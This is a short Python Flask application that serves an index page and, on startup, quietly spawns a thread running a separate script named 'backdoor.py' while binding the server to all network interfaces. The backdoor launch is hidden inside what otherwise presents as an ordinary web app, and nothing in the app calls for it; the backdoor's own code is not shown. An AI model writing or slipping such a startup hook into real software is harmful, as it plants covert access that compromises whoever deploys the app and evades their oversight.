from flask import Flask, render_template
import threading
import subprocess

app = Flask(__name__, template_folder='templates')

def run_backdoor():
    subprocess.Popen(["python", "backdoor.py"])

@app.route('/')
def index():
    return render_template('index.html')

if __name__ == '__main__':
    threading.Thread(target=run_backdoor).start()
    app.run(host="0.0.0.0", port=5000)